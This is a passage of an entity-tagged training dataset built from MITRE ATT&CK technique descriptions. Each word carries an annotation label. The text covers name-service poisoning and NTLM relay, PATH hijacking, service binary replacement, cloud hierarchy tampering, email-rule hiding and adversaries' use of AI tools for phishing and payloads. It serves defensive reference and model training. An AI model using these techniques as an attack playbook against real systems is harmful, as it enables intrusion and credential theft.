a I-PRECON
hardcoded I-PRECON
or I-PRECON
user-supplied I-PRECON
key I-PRECON
, O
as O
well O
as O
otherwise O
obfuscated O
using O
standard O
encoding O
schemes O
such O
as O
Base64 O
. O 


The O
entire O
content O
of O
a O
file B-TARGET_ASSET
may O
be O
obfuscated B-PRECON
, O
or O
just O
specific O
functions O
or O
values O
(such O
as O
C2 O
addresses) O
. O 

Encryption O
and O
encoding O
may O
also O
be O
applied O
in O
redundant O
layers O
for O
additional O
protection O
. O 


For O
example O
, O
adversaries O
may O
abuse O
password-protected B-PRECON
Word B-TARGET_ASSET
documents I-TARGET_ASSET
or O
self-extracting B-TARGET_ASSET
( I-TARGET_ASSET
SFX I-TARGET_ASSET
) I-TARGET_ASSET
archives I-TARGET_ASSET
as O
a O
method O
of O
encrypting/encoding O
a O
file B-TARGET_ASSET
such O
as O
a O
[Phishing](https://attack.mitre.org/techniques/T1566) O
payload B-TARGET_ASSET
. O 

These O
files B-TARGET_ASSET
typically O
function O
by O
attaching O
the O
intended O
archived O
content O
to O
a O
decompressor B-TARGET_ASSET
stub I-TARGET_ASSET
that O
is O
executed O
when O
the O
file B-TARGET_ASSET
is O
invoked O
(e.g., O
[User O
Execution](https://attack.mitre.org/techniques/T1204)) O
. O 

(Citation: O
SFX O
- O
Encrypted/Encoded O
File) O

Adversaries O
may O
also O
abuse O
file-specific O
as O
well O
as O
custom O
encoding O
schemes O
. O 

For O
example O
, O
Byte O
Order O
Mark O
(BOM) O
headers B-TARGET_ASSET
in O
text B-TARGET_ASSET
files I-TARGET_ASSET
may O
be O
abused O
to O
manipulate O
and O
obfuscate O
file B-TARGET_ASSET
content I-TARGET_ASSET
until O
[Command B-TARGET_ASSET
and I-TARGET_ASSET
Scripting I-TARGET_ASSET
Interpreter](https://attack.mitre.org/techniques/T1059) I-TARGET_ASSET
execution O
. O 


Link-Local B-TARGET_ASSET
Multicast I-TARGET_ASSET
Name I-TARGET_ASSET
Resolution I-TARGET_ASSET
( I-TARGET_ASSET
LLMNR I-TARGET_ASSET
) I-TARGET_ASSET
and O
NetBIOS B-TARGET_ASSET
Name I-TARGET_ASSET
Service I-TARGET_ASSET
( I-TARGET_ASSET
NBT-NS I-TARGET_ASSET
) I-TARGET_ASSET
are O
Microsoft O
Windows O
components O
that O
serve O
as O
alternate O
methods O
of O
host O
identification O
. O 

LLMNR B-TARGET_ASSET
is O
based O
upon O
the O
Domain B-TARGET_ASSET
Name I-TARGET_ASSET
System I-TARGET_ASSET
( I-TARGET_ASSET
DNS I-TARGET_ASSET
) I-TARGET_ASSET
format O
and O
allows O
hosts B-TARGET_ASSET
on O
the O
same O
local O
link O
to O
perform O
name O
resolution O
for O
other O
hosts B-TARGET_ASSET
. O 

NBT-NS B-TARGET_ASSET
identifies O
systems B-TARGET_ASSET
on O
a O
local O
network O
by O
their O
NetBIOS O
name O
. O 

(Citation: O
Wikipedia O
LLMNR) O
(Citation: O
TechNet O
NetBIOS) O

Adversaries O
can O
spoof O
an O
authoritative O
source O
for O
name O
resolution O
on O
a O
victim O
network B-TARGET_ASSET
by O
responding O
to O
LLMNR B-TARGET_ASSET
(UDP O
5355)/NBT-NS B-TARGET_ASSET
(UDP O
137) O
traffic O
as O
if O
they O
know O
the O
identity O
of O
the O
requested O
host B-TARGET_ASSET
, O
effectively O
poisoning O
the O
service B-TARGET_ASSET
so O
that O
the O
victims O
will O
communicate O
with O
the O
adversary O
controlled O
system B-TARGET_ASSET
. O 

If O
the O
requested O
host B-TARGET_ASSET
belongs O
to O
a O
resource O
that O
requires O
identification/authentication O
, O
the O
username O
and O
NTLMv2 B-TARGET_ASSET
hash I-TARGET_ASSET
will O
then O
be O
sent O
to O
the O
adversary O
controlled O
system B-TARGET_ASSET
. O 

The O
adversary O
can O
then O
collect O
the O
hash B-TARGET_ASSET
information I-TARGET_ASSET
sent O
over O
the O
wire O
through O
tools B-TARGET_ASSET
that O
monitor O
the O
ports B-TARGET_ASSET
for O
traffic O
or O
through O
[Network B-TARGET_ASSET
Sniffing](https://attack.mitre.org/techniques/T1040) I-TARGET_ASSET
and O
crack O
the O
hashes B-TARGET_ASSET
offline O
through O
[Brute O
Force](https://attack.mitre.org/techniques/T1110) O
to O
obtain O
the O
plaintext O
passwords B-TARGET_ASSET
. O 

In O
some O
cases O
where O
an O
adversary O
has O
access O
to O
a O
system B-TARGET_ASSET
that O
is O
in O
the O
authentication O
path O
between O
systems O
or O
when O
automated O
scans O
that O
use O
credentials B-TARGET_ASSET
attempt O
to O
authenticate O
to O
an O
adversary O
controlled O
system B-TARGET_ASSET
, O
the O
NTLMv2 B-TARGET_ASSET
hashes I-TARGET_ASSET
can O
be O
intercepted O
and O
relayed O
to O
access O
and O
execute O
code O
against O
a O
target O
system B-TARGET_ASSET
. O 

The O
relay O
step O
can O
happen O
in O
conjunction O
with O
poisoning O
but O
may O
also O
be O
independent O
of O
it O
. O 

(Citation: O
byt3bl33d3r O
NTLM O
Relaying)(Citation: O
Secure O
Ideas O
SMB O
Relay) O

Several O
tools B-TARGET_ASSET
exist O
that O
can O
be O
used O
to O
poison O
name O
services B-TARGET_ASSET
within O
local O
networks B-TARGET_ASSET
such O
as O
NBNSpoof B-TARGET_ASSET
, O
Metasploit B-TARGET_ASSET
, O
and O
[Responder](https://attack.mitre.org/software/S0174) B-TARGET_ASSET
. O 

(Citation: O
GitHub O
NBNSpoof) O
(Citation: O
Rapid7 O
LLMNR O
Spoofer) O
(Citation: O
GitHub O
Responder) O

Adversaries O
may O
gather O
the O
victim's O
IP B-TARGET_ASSET
addresses I-TARGET_ASSET
that O
can O
be O
used O
during O
targeting O
. O 

Public O
IP B-TARGET_ASSET
addresses I-TARGET_ASSET
may O
be O
allocated B-PRECON
to O
organizations O
by O
block O
, O
or O
a O
range O
of O
sequential O
addresses O
. O 

Information O
about O
assigned O
IP B-TARGET_ASSET
addresses I-TARGET_ASSET
may O
include O
a O
variety O
of O
details O
, O
such O
as O
which O
IP B-TARGET_ASSET
addresses I-TARGET_ASSET
are O
in B-PRECON
use I-PRECON
. O 

IP B-TARGET_ASSET
addresses I-TARGET_ASSET
may O
also O
enable O
an O
adversary O
to O
derive O
other O
details O
about O
a O
victim O
, O
such O
as O
organizational O
size O
, O
physical O
location(s) O
, O
Internet O
service O
provider O
, O
and O
or O
where/how O
their O
publicly-facing O
infrastructure B-TARGET_ASSET
is O
hosted B-PRECON
. O 


Adversaries O
may O
gather O
this O
information O
in O
various O
ways O
, O
such O
as O
direct O
collection O
actions O
via O
[Active O
Scanning](https://attack.mitre.org/techniques/T1595) O
or O
[Phishing O
for O
Information](https://attack.mitre.org/techniques/T1598) O
. O 

Information O
about O
assigned O
IP B-TARGET_ASSET
addresses I-TARGET_ASSET
may O
also O
be O
exposed B-PRECON
to O
adversaries O
via O
online O
or O
other O
accessible O
data O
sets O
(ex: O
[Search O
Open O
Technical O
Databases](https://attack.mitre.org/techniques/T1596)) O
. O 

(Citation: O
WHOIS)(Citation: O
DNS O
Dumpster)(Citation: O
Circl O
Passive O
DNS) O
Gathering O
this O
information O
may O
reveal O
opportunities O
for O
other O
forms O
of O
reconnaissance O
(ex: O
[Active O
Scanning](https://attack.mitre.org/techniques/T1595) O
or O
[Search O
Open O
Websites/Domains](https://attack.mitre.org/techniques/T1593)) O
, O
establishing O
operational O
resources O
(ex: O
[Acquire O
Infrastructure](https://attack.mitre.org/techniques/T1583) O
or O
[Compromise O
Infrastructure](https://attack.mitre.org/techniques/T1584)) O
, O
and/or O
initial O
access O
(ex: O
[External O
Remote O
Services](https://attack.mitre.org/techniques/T1133)) O
. O 


Adversaries O
may O
attempt O
to O
cause O
a O
denial O
of O
service O
(DoS) O
by O
directly O
sending O
a O
high-volume O
of O
network O
traffic B-TARGET_ASSET
to O
a O
target O
. O 

This O
DoS O
attack O
may O
also O
reduce O
the O
availability O
and O
functionality O
of O
the O
targeted O
system(s) B-TARGET_ASSET
and O
network B-TARGET_ASSET
. O 

[Direct B-TARGET_ASSET
Network I-TARGET_ASSET
Flood](https://attack.mitre.org/techniques/T1498/001) I-TARGET_ASSET
s O
are O
when O
one O
or O
more O
systems B-TARGET_ASSET
are O
used O
to O
send O
a O
high-volume O
of O
network B-TARGET_ASSET
packets I-TARGET_ASSET
towards O
the O
targeted O
service's B-TARGET_ASSET
network I-TARGET_ASSET
. O 

Almost O
any O
network B-TARGET_ASSET
protocol I-TARGET_ASSET
may O
be O
used O
for O
flooding O
. O 

Stateless O
protocols B-TARGET_ASSET
such O
as O
UDP B-TARGET_ASSET
or O
ICMP B-TARGET_ASSET
are O
commonly O
used O
but O
stateful O
protocols B-TARGET_ASSET
such O
as O
TCP B-TARGET_ASSET
can O
be O
used O
as O
well O
. O 


Botnets B-TARGET_ASSET
are O
commonly O
used O
to O
conduct O
network B-TARGET_ASSET
flooding I-TARGET_ASSET
attacks I-TARGET_ASSET
against O
networks B-TARGET_ASSET
and O
services B-TARGET_ASSET
. O 

Large O
botnets B-TARGET_ASSET
can O
generate O
a O
significant O
amount O
of O
traffic O
from O
systems B-TARGET_ASSET
spread B-PRECON
across I-PRECON
the I-PRECON
global I-PRECON
Internet I-PRECON
. O 

Adversaries O
may O
have O
the O
resources O
to O
build O
out O
and O
control O
their O
own O
botnet B-TARGET_ASSET
infrastructure I-TARGET_ASSET
or O
may O
rent O
time O
on O
an O
existing O
botnet B-TARGET_ASSET
to O
conduct O
an O
attack O
. O 

In O
some O
of O
the O
worst O
cases O
for O
distributed O
DoS O
(DDoS) O
, O
so O
many O
systems B-TARGET_ASSET
are O
used O
to O
generate O
the O
flood O
that O
each O
one O
only O
needs O
to O
send O
out O
a O
small O
amount O
of O
traffic O
to O
produce O
enough O
volume O
to O
saturate O
the O
target O
network B-TARGET_ASSET
. O 

In O
such O
circumstances O
, O
distinguishing O
DDoS O
traffic O
from O
legitimate O
clients O
becomes O
exceedingly O
difficult O
. O 

Botnets B-TARGET_ASSET
have O
been O
used O
in O
some O
of O
the O
most O
high-profile O
DDoS O
flooding O
attacks O
, O
such O
as O
the O
2012 O
series O
of O
incidents O
that O
targeted O
major O
US O
banks O
. O 

(Citation: O
USNYAG O
IranianBotnet O
March O
2016) O

Adversaries O
may O
insert O
, O
delete O
, O
or O
manipulate O
data B-TARGET_ASSET
at B-PRECON
rest I-PRECON
in O
order O
to O
manipulate O
external O
outcomes O
or O
hide O
activity O
. O 

(Citation: O
FireEye O
APT38 O
Oct O
2018)(Citation: O
DOJ O
Lazarus O
Sony O
2018) O
By O
manipulating O
stored O
data B-TARGET_ASSET
, O
adversaries O
may O
attempt O
to O
affect O
a O
business O
process O
, O
organizational O
understanding O
, O
and O
decision O
making O
. O 


Stored O
data B-TARGET_ASSET
could O
include O
a O
variety O
of O
file B-TARGET_ASSET
formats I-TARGET_ASSET
, O
such O
as O
Office O
files B-TARGET_ASSET
, O
databases B-TARGET_ASSET
, O
stored O
emails B-TARGET_ASSET
, O
and O
custom O
file B-TARGET_ASSET
formats I-TARGET_ASSET
. O 

The O
type O
of O
modification O
and O
the O
impact O
it O
will O
have O
depends O
on O
the O
type O
of O
data O
as O
well O
as O
the O
goals O
and O
objectives O
of O
the O
adversary O
. O 

For O
complex O
systems O
, O
an O
adversary O
would O
likely O
need O
special O
expertise O
and O
possibly O
access O
to O
specialized O
software O
related O
to O
the O
system O
that O
would O
typically O
be O
gained O
through O
a O
prolonged O
information O
gathering O
campaign O
in O
order O
to O
have O
the O
desired O
impact O
. O 


Adversaries O
may O
execute O
their O
own O
malicious O
payloads B-TARGET_ASSET
by O
hijacking O
environment B-TARGET_ASSET
variables I-TARGET_ASSET
used O
to O
load O
libraries B-TARGET_ASSET
. O 

The O
PATH B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
contains O
a O
list O
of O
directories O
(User O
and O
System) O
that O
the O
OS B-TARGET_ASSET
searches O
sequentially O
through O
in O
search O
of O
the O
binary B-TARGET_ASSET
that O
was O
called O
from O
a O
script O
or O
the O
command O
line O
. O 


Adversaries O
can O
place O
a O
malicious O
program B-TARGET_ASSET
in O
an O
earlier O
entry O
in O
the O
list O
of O
directories O
stored O
in O
the O
PATH B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
, O
resulting O
in O
the O
operating B-TARGET_ASSET
system I-TARGET_ASSET
executing O
the O
malicious O
binary B-TARGET_ASSET
rather O
than O
the O
legitimate O
binary B-TARGET_ASSET
when O
it O
searches O
sequentially O
through O
that O
PATH O
listing O
. O 


For O
example O
, O
on O
Windows O
if O
an O
adversary O
places O
a O
malicious O
program B-TARGET_ASSET
named O
""net.exe"" O
in O
`C:\example O
path` O
, O
which O
by O
default B-PRECON
precedes I-PRECON
`C:\Windows\system32\net.exe` O
in O
the O
PATH B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
, O
when O
""net"" O
is O
executed O
from O
the O
command-line O
the O
`C:\example O
path` O
will O
be O
called O
instead O
of O
the O
system's O
legitimate O
executable B-TARGET_ASSET
at O
`C:\Windows\system32\net.exe` O
. O 

Some O
methods O
of O
executing O
a O
program B-TARGET_ASSET
rely O
on O
the O
PATH B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
to O
determine O
the O
locations O
that O
are O
searched O
when O
the O
path O
for O
the O
program B-TARGET_ASSET
is O
not O
given O
, O
such O
as O
executing O
programs B-TARGET_ASSET
from O
a O
[Command B-TARGET_ASSET
and I-TARGET_ASSET
Scripting I-TARGET_ASSET
Interpreter](https://attack.mitre.org/techniques/T1059) I-TARGET_ASSET
. O 

(Citation: O
ExpressVPN O
PATH O
env O
Windows O
2021) O

Adversaries O
may O
also O
directly O
modify O
the O
$PATH B-TARGET_ASSET
variable I-TARGET_ASSET
specifying O
the O
directories O
to O
be O
searched O
. O 

An O
adversary O
can O
modify O
the O
`$PATH` B-TARGET_ASSET
variable I-TARGET_ASSET
to O
point O
to O
a O
directory O
they O
have O
write O
access O
. O 

When O
a O
program B-TARGET_ASSET
using O
the O
$PATH B-TARGET_ASSET
variable I-TARGET_ASSET
is O
called O
, O
the O
OS B-TARGET_ASSET
searches O
the O
specified O
directory O
and O
executes O
the O
malicious O
binary B-TARGET_ASSET
. O 

On O
macOS O
, O
this O
can O
also O
be O
performed O
through O
modifying O
the O
$HOME B-TARGET_ASSET
variable I-TARGET_ASSET
. O 

These O
variables B-TARGET_ASSET
can O
be O
modified O
using O
the O
command-line O
, O
launchctl O
, O
[Unix O
Shell O
Configuration O
Modification](https://attack.mitre.org/techniques/T1546/004) O
, O
or O
modifying O
the O
`/etc/paths.d` O
folder O
contents O
. O 

(Citation: O
uptycs O
Fake O
POC O
linux O
malware O
2023)(Citation: O
nixCraft O
macOS O
PATH O
variables)(Citation: O
Elastic O
Rules O
macOS O
launchctl O
2022) O

Adversaries O
may O
leverage O
the O
SharePoint B-TARGET_ASSET
repository I-TARGET_ASSET
as O
a O
source O
to O
mine O
valuable O
information O
. O 

SharePoint B-TARGET_ASSET
will O
often O
contain O
useful O
information O
for O
an O
adversary O
to O
learn O
about O
the O
structure O
and O
functionality O
of O
the O
internal O
network B-TARGET_ASSET
and O
systems B-TARGET_ASSET
. O 

For O
example O
, O
the O
following O
is O
a O
list O
of O
example O
information O
that O
may O
hold O
potential O
value O
to O
an O
adversary O
and O
may O
also O
be O
found O
on O
SharePoint B-TARGET_ASSET
: O

* O
Policies O
, O
procedures O
, O
and O
standards O
* O
Physical O
/ O
logical O
network B-TARGET_ASSET
diagrams I-TARGET_ASSET
* O
System B-TARGET_ASSET
architecture I-TARGET_ASSET
diagrams I-TARGET_ASSET
* O
Technical O
system B-TARGET_ASSET
documentation I-TARGET_ASSET
* O
Testing O
/ O
development O
credentials B-TARGET_ASSET
(i.e., O
[Unsecured B-TARGET_ASSET
Credentials](https://attack.mitre.org/techniques/T1552) I-TARGET_ASSET
) O
* O
Work O
/ O
project O
schedules O
* O
Source O
code O
snippets O
* O
Links O
to O
network B-TARGET_ASSET
shares I-TARGET_ASSET
and O
other O
internal O
resources O

Adversaries O
may O
directly O
access O
a O
volume B-TARGET_ASSET
to O
bypass O
file B-TARGET_ASSET
access I-TARGET_ASSET
controls I-TARGET_ASSET
and O
file B-TARGET_ASSET
system I-TARGET_ASSET
monitoring I-TARGET_ASSET
. O 

Windows O
allows O
programs O
to O
have O
direct B-PRECON
access I-PRECON
to O
logical B-TARGET_ASSET
volumes I-TARGET_ASSET
. O 

Programs O
with O
direct B-PRECON
access I-PRECON
may O
read O
and O
write O
files B-TARGET_ASSET
directly O
from O
the O
drive B-TARGET_ASSET
by O
analyzing O
file B-TARGET_ASSET
system I-TARGET_ASSET
data I-TARGET_ASSET
structures I-TARGET_ASSET
. O 

This O
technique O
may O
bypass O
Windows O
file B-TARGET_ASSET
access I-TARGET_ASSET
controls I-TARGET_ASSET
as O
well O
as O
file B-TARGET_ASSET
system I-TARGET_ASSET
monitoring I-TARGET_ASSET
tools I-TARGET_ASSET
. O 

(Citation: O
Hakobyan O
2009) O

Utilities B-TARGET_ASSET
, O
such O
as O
`NinjaCopy` O
, O
exist O
to O
perform O
these O
actions O
in O
PowerShell B-TARGET_ASSET
. O 

(Citation: O
Github O
PowerSploit O
Ninjacopy) O
Adversaries O
may O
also O
use O
built-in O
or O
third-party O
utilities B-TARGET_ASSET
(such O
as O
`vssadmin` O
, O
`wbadmin` O
, O
and O
[esentutl](https://attack.mitre.org/software/S0404) B-TARGET_ASSET
) O
to O
create O
shadow B-TARGET_ASSET
copies I-TARGET_ASSET
or O
backups B-TARGET_ASSET
of O
data B-TARGET_ASSET
from O
system B-TARGET_ASSET
volumes I-TARGET_ASSET
. O 

(Citation: O
LOLBAS O
Esentutl) O

Processes O
may O
automatically O
execute O
specific O
binaries B-TARGET_ASSET
as O
part O
of O
their O
functionality O
or O
to O
perform O
other O
actions O
. O 

If O
the O
permissions O
on O
the O
file B-TARGET_ASSET
system I-TARGET_ASSET
directory I-TARGET_ASSET
containing O
a O
target O
binary B-TARGET_ASSET
, O
or O
permissions O
on O
the O
binary B-TARGET_ASSET
itself O
, O
are O
improperly B-PRECON
set I-PRECON
, O
then O
the O
target O
binary B-TARGET_ASSET
may O
be O
overwritten O
with O
another O
binary B-TARGET_ASSET
using O
user-level O
permissions O
and O
executed O
by O
the O
original O
process B-TARGET_ASSET
. O 

If O
the O
original O
process B-TARGET_ASSET
and O
thread O
are O
running B-PRECON
under I-PRECON
a I-PRECON
higher I-PRECON
permissions I-PRECON
level I-PRECON
, O
then O
the O
replaced O
binary B-TARGET_ASSET
will O
also O
execute O
under O
higher-level O
permissions O
, O
which O
could O
include O
SYSTEM O
. O 


Adversaries O
may O
use O
this O
technique O
to O
replace O
legitimate O
binaries B-TARGET_ASSET
with O
malicious O
ones O
as O
a O
means O
of O
executing O
code O
at O
a O
higher O
permissions O
level O
. O 

If O
the O
executing O
process B-TARGET_ASSET
is O
set B-PRECON
to I-PRECON
run I-PRECON
at I-PRECON
a I-PRECON
specific I-PRECON
time I-PRECON
or O
during O
a O
certain O
event O
(e.g., O
system O
bootup) O
then O
this O
technique O
can O
also O
be O
used O
for O
persistence O
. O 


### O
Services O
Manipulation O
of O
Windows O
service B-TARGET_ASSET
binaries I-TARGET_ASSET
is O
one O
variation O
of O
this O
technique O
. O 

Adversaries O
may O
replace O
a O
legitimate O
service B-TARGET_ASSET
executable I-TARGET_ASSET
with O
their O
own O
executable B-TARGET_ASSET
to O
gain O
persistence O
and/or O
privilege O
escalation O
to O
the O
account O
context O
the O
service B-TARGET_ASSET
is O
set B-PRECON
to I-PRECON
execute I-PRECON
under I-PRECON
(local/domain O
account, O
SYSTEM, O
LocalService, O
or O
NetworkService) O
. O 

Once O
the O
service B-TARGET_ASSET
is O
started O
, O
either O
directly O
by O
the O
user O
(if O
appropriate O
access O
is O
available) O
or O
through O
some O
other O
means O
, O
such O
as O
a O
system O
restart O
if O
the O
service B-TARGET_ASSET
starts B-PRECON
on I-PRECON
bootup I-PRECON
, O
the O
replaced O
executable B-TARGET_ASSET
will O
run O
instead O
of O
the O
original O
service B-TARGET_ASSET
executable I-TARGET_ASSET
. O 


### O
Executable O
Installers O
Another O
variation O
of O
this O
technique O
can O
be O
performed O
by O
taking O
advantage O
of O
a O
weakness O
that O
is O
common O
in O
executable B-TARGET_ASSET
, O
self-extracting B-TARGET_ASSET
installers I-TARGET_ASSET
. O 

During O
the O
installation O
process O
, O
it O
is O
common O
for O
installers B-TARGET_ASSET
to O
use O
a O
subdirectory O
within O
the O
<code>%TEMP%</code> O
directory O
to O
unpack O
binaries B-TARGET_ASSET
such O
as O
DLLs B-TARGET_ASSET
, O
EXEs B-TARGET_ASSET
, O
or O
other O
payloads B-TARGET_ASSET
. O 

When O
installers B-TARGET_ASSET
create O
subdirectories O
and O
files O
they O
often O
do O
not O
set O
appropriate O
permissions O
to O
restrict O
write O
access O
, O
which O
allows O
for O
execution O
of O
untrusted O
code O
placed O
in O
the O
subdirectories O
or O
overwriting O
of O
binaries B-TARGET_ASSET
used O
in O
the O
installation O
process O
. O 

This O
behavior O
is O
related O
to O
and O
may O
take O
advantage O
of O
[DLL B-TARGET_ASSET
Search I-TARGET_ASSET
Order I-TARGET_ASSET
Hijacking](https://attack.mitre.org/techniques/T1038) I-TARGET_ASSET
. O 

Some O
installers B-TARGET_ASSET
may O
also O
require O
elevated B-PRECON
privileges I-PRECON
that O
will O
result O
in O
privilege O
escalation O
when O
executing O
adversary O
controlled O
code O
. O 

This O
behavior O
is O
related O
to O
[Bypass O
User O
Account O
Control](https://attack.mitre.org/techniques/T1088) O
. O 

Several O
examples O
of O
this O
weakness O
in O
existing O
common O
installers B-TARGET_ASSET
have O
been O
reported O
to O
software O
vendors O
. O 

(Citation: O
Mozilla O
Firefox O
Installer O
DLL O
Hijack) O
(Citation: O
Seclists O
Kanthak O
7zip O
Installer) O

Adversaries O
may O
obtain O
access O
to O
generative B-TARGET_ASSET
artificial I-TARGET_ASSET
intelligence I-TARGET_ASSET
tools I-TARGET_ASSET
, O
such O
as O
large B-TARGET_ASSET
language I-TARGET_ASSET
models I-TARGET_ASSET
( I-TARGET_ASSET
LLMs I-TARGET_ASSET
) I-TARGET_ASSET
, O
to O
aid O
various O
techniques O
during O
targeting O
. O 

These O
tools B-TARGET_ASSET
may O
be O
used O
to O
inform O
, O
bolster O
, O
and O
enable O
a O
variety O
of O
malicious O
tasks O
, O
including O
conducting O
[Reconnaissance](https://attack.mitre.org/tactics/TA0043) O
, O
creating O
basic O
scripts B-TARGET_ASSET
, O
assisting O
social O
engineering O
, O
and O
even O
developing O
payloads B-TARGET_ASSET
. O 

(Citation: O
MSFT-AI) O

For O
example O
, O
by O
utilizing O
a O
publicly B-PRECON
available I-PRECON
LLM B-TARGET_ASSET
an O
adversary O
is O
essentially O
outsourcing O
or O
automating O
certain O
tasks O
to O
the O
tool B-TARGET_ASSET
. O 

Using O
AI O
, O
the O
adversary O
may O
draft O
and O
generate O
content O
in O
a O
variety O
of O
written O
languages O
to O
be O
used O
in O
[Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing O
for O
Information](https://attack.mitre.org/techniques/T1598) O
campaigns O
. O 

The O
same O
publicly B-PRECON
available I-PRECON
tool B-TARGET_ASSET
may O
further O
enable O
vulnerability O
or O
other O
offensive O
research O
supporting O
[Develop O
Capabilities](https://attack.mitre.org/techniques/T1587) O
. O 

AI B-TARGET_ASSET
tools I-TARGET_ASSET
may O
also O
automate O
technical O
tasks O
by O
generating O
, O
refining O
, O
or O
otherwise O
enhancing O
(e.g., O
[Obfuscated O
Files O
or O
Information](https://attack.mitre.org/techniques/T1027)) O
malicious O
scripts B-TARGET_ASSET
and O
payloads B-TARGET_ASSET
. O 

(Citation: O
OpenAI-CTI) O
Finally O
, O
AI-generated O
text O
, O
images O
, O
audio O
, O
and O
video O
may O
be O
used O
for O
fraud O
, O
[Impersonation](https://attack.mitre.org/techniques/T1656) O
, O
and O
other O
malicious O
activities O
. O 

(Citation: O
Google-Vishing24)(Citation: O
IC3-AI24)(Citation: O
WSJ-Vishing-AI24) O

Adversaries O
may O
attempt O
to O
modify O
hierarchical O
structures O
in O
infrastructure-as-a-service B-TARGET_ASSET
( I-TARGET_ASSET
IaaS I-TARGET_ASSET
) I-TARGET_ASSET
environments I-TARGET_ASSET
in O
order O
to O
evade O
defenses O
. O 


IaaS B-TARGET_ASSET
environments I-TARGET_ASSET
often O
group O
resources O
into O
a O
hierarchy O
, O
enabling O
improved O
resource O
management O
and O
application O
of O
policies O
to O
relevant O
groups O
. O 

Hierarchical O
structures O
differ O
among O
cloud O
providers O
. O 

For O
example O
, O
in O
AWS B-TARGET_ASSET
environments I-TARGET_ASSET
, O
multiple O
accounts B-TARGET_ASSET
can O
be O
grouped O
under O
a O
single O
organization B-TARGET_ASSET
, O
while O
in O
Azure B-TARGET_ASSET
environments I-TARGET_ASSET
, O
multiple O
subscriptions B-TARGET_ASSET
can O
be O
grouped O
under O
a O
single O
management B-TARGET_ASSET
group I-TARGET_ASSET
. O 

(Citation: O
AWS O
Organizations)(Citation: O
Microsoft O
Azure O
Resources) O

Adversaries O
may O
add O
, O
delete O
, O
or O
otherwise O
modify O
resource B-TARGET_ASSET
groups I-TARGET_ASSET
within O
an O
IaaS B-TARGET_ASSET
hierarchy I-TARGET_ASSET
. O 

For O
example O
, O
in O
Azure B-TARGET_ASSET
environments I-TARGET_ASSET
, O
an O
adversary O
who O
has O
gained O
access O
to O
a O
Global O
Administrator O
account B-TARGET_ASSET
may O
create O
new O
subscriptions B-TARGET_ASSET
in O
which O
to O
deploy O
resources O
. O 

They O
may O
also O
engage O
in O
subscription O
hijacking O
by O
transferring O
an O
existing O
pay-as-you-go O
subscription B-TARGET_ASSET
from O
a O
victim O
tenant O
to O
an O
adversary-controlled O
tenant O
. O 

This O
will O
allow O
the O
adversary O
to O
use O
the O
victim’s O
compute O
resources O
without O
generating O
logs B-TARGET_ASSET
on O
the O
victim O
tenant O
. O 

(Citation: O
Microsoft O
Peach O
Sandstorm O
2023)(Citation: O
Microsoft O
Subscription O
Hijacking O
2022) O

In O
AWS B-TARGET_ASSET
environments I-TARGET_ASSET
, O
adversaries O
with O
appropriate O
permissions O
in O
a O
given O
account B-TARGET_ASSET
may O
call O
the O
`LeaveOrganization` B-TARGET_ASSET
API I-TARGET_ASSET
, O
causing O
the O
account B-TARGET_ASSET
to O
be O
severed O
from O
the O
AWS B-TARGET_ASSET
Organization I-TARGET_ASSET
to O
which O
it O
was O
tied O
and O
removing O
any O
Service B-TARGET_ASSET
Control I-TARGET_ASSET
Policies I-TARGET_ASSET
, O
guardrails O
, O
or O
restrictions O
imposed O
upon O
it O
by O
its O
former O
Organization B-TARGET_ASSET
. O 

Alternatively O
, O
adversaries O
may O
call O
the O
`CreateAccount` B-TARGET_ASSET
API I-TARGET_ASSET
in O
order O
to O
create O
a O
new O
account B-TARGET_ASSET
within O
an O
AWS B-TARGET_ASSET
Organization I-TARGET_ASSET
. O 

This O
account B-TARGET_ASSET
will O
use O
the O
same O
payment O
methods O
registered O
to O
the O
payment O
account O
but O
may O
not O
be O
subject O
to O
existing O
detections O
or O
Service B-TARGET_ASSET
Control I-TARGET_ASSET
Policies I-TARGET_ASSET
. O 

(Citation: O
AWS O
RE:Inforce O
Threat O
Detection O
2024) O

Adversaries O
may O
use O
email B-TARGET_ASSET
rules I-TARGET_ASSET
to O
hide O
inbound O
emails B-TARGET_ASSET
in O
a O
compromised O
user's O
mailbox B-TARGET_ASSET
. O 

Many O
email B-TARGET_ASSET
clients I-TARGET_ASSET
allow O
users O
to O
create O
inbox B-TARGET_ASSET
rules I-TARGET_ASSET
for O
various O
email O
functions O
, O
including O
moving O
emails B-TARGET_ASSET
to O
other O
folders O
, O
marking O
emails B-TARGET_ASSET
as O
read O
, O
or O
deleting O
emails B-TARGET_ASSET
. O 

Rules B-TARGET_ASSET
may O
be O
created O
or O
modified O
within O
email B-TARGET_ASSET
clients I-TARGET_ASSET
or O
through O
external O
features O
such O
as O
the O
<code>New-InboxRule</code> O
or O
<code>Set-InboxRule</code> O
[PowerShell](https://attack.mitre.org/techniques/T1059/001) B-TARGET_ASSET
cmdlets I-TARGET_ASSET
on O
Windows O
systems B-TARGET_ASSET
. O 

(Citation: O
Microsoft O
Inbox O
Rules)(Citation: O
MacOS O
Email O
Rules)(Citation: O
Microsoft O
New-InboxRule)(Citation: O
Microsoft O
Set-InboxRule) O

Adversaries O
may O
utilize O
email B-TARGET_ASSET
rules I-TARGET_ASSET
within O
a O
compromised B-PRECON
user's O
mailbox B-TARGET_ASSET
to O
delete O
and/or O
move O
emails B-TARGET_ASSET
to O
less O
noticeable O
folders O
. O 

Adversaries O
may O
do O
this O
to O
hide O
security O
alerts B-TARGET_ASSET
, O
C2 O
communication B-TARGET_ASSET
, O
or O
responses O
to O
[Internal O
Spearphishing](https://attack.mitre.org/techniques/T1534) O
emails B-TARGET_ASSET
sent O
from O
the O
compromised O
account B-TARGET_ASSET
. O 


Any O
user O
or O
administrator O
within O
the O
organization O
(or O
adversary O
with O
valid O
credentials) O
may O
be O
able O
to O
create O
rules B-TARGET_ASSET
to O
automatically O
move O
or O
delete O
emails B-TARGET_ASSET
. O 

These O
rules B-TARGET_ASSET
can O
be O
abused O
to O
impair/delay O
detection O
had O
the O
email B-TARGET_ASSET
content I-TARGET_ASSET
been O
immediately O
seen O
by O
a O
user O
or O
defender O
. O 

Malicious O
rules B-TARGET_ASSET
commonly O
filter O
out O
emails B-TARGET_ASSET
based O
on O
key O
words O
(such O
as O
<code>malware</code> O
, O
<code>suspicious</code> O
, O
<code>phish</code> O
, O
and O
